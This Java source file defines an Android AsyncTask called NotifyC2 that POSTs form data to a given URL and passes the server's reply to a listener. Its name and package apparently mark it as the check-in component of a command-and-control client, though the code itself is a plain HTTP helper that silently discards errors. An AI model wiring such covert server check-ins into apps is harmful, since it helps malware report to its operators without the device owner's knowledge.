package com.ot.grhq.client.receivers;

import android.os.AsyncTask;

import org.json.JSONException;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;

public class NotifyC2 extends AsyncTask<Void, Void, String> {

    private String postURL;
    private String formData;
    private PostDataListener listener;

    public NotifyC2(String postURL, String formData, PostDataListener listener) {
        this.postURL = postURL;
        this.formData = formData;
        this.listener = listener;
    }

    public interface PostDataListener {
        void onDataPosted(String result) throws JSONException;
    }

    @Override
    protected String doInBackground(Void... voids) {
        HttpURLConnection urlConnection = null;

        try {
            URL url = new URL(postURL);
            urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setRequestMethod("POST");
            urlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            urlConnection.setRequestProperty("Accept", "*/*");
            urlConnection.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
            urlConnection.setDoOutput(true);

            OutputStream outputStream = urlConnection.getOutputStream();
            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(outputStream, "UTF-8"));
            writer.write(formData);
            writer.flush();
            writer.close();
            outputStream.close();

            // 6. Read the response from the server
            BufferedReader reader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();

            // 7. Handle JSON response
            String jsonResponse = response.toString();
            return jsonResponse;
        } catch (IOException e) {
        }

        return null;
    }

    @Override
    protected void onPostExecute(String result) {
        if (listener != null) {
            try {
                listener.onDataPosted(result);
            } catch (JSONException e) {}
        }
    }
}
